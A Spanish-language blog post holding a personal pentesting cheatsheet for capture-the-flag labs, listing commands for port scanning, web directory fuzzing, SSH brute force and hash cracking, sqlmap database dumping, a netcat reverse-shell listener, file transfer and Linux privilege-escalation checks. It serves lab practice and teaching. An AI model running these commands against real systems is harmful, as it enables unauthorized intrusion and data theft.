---
layout: post
title: Cheatsheet
permalink: /cheatsheet/
---
Comandos que más uso en laboratorios (DockerLabs, HTB, etc.). Solo para entornos autorizados.

## Reconocimiento
```
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv IP -oG allPorts
nmap -sCV -p22,80 IP -oN targeted
```

## Enumeración web
```
gobuster dir -u http://IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
ffuf -u http://IP/FUZZ -w WORDLIST -mc 200,301,302
whatweb http://IP
```

## Fuerza bruta
```
hydra -l USUARIO -P /usr/share/wordlists/rockyou.txt ssh://IP
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Inyección SQL
```
sqlmap -u "http://IP/page.php?id=1" --batch --dbs
sqlmap -u "http://IP/page.php?id=1" -D DB -T TABLA --dump
```

## Shell y tratamiento de TTY
```
nc -lvnp 4444
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm SHELL=bash
```

## Transferencia de archivos
```
python3 -m http.server 8000
wget http://IP:8000/archivo
```

## Escalada de privilegios (Linux)
```
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
id; uname -a
```
Consulta GTFOBins para cada binario sudo/SUID que encuentres.
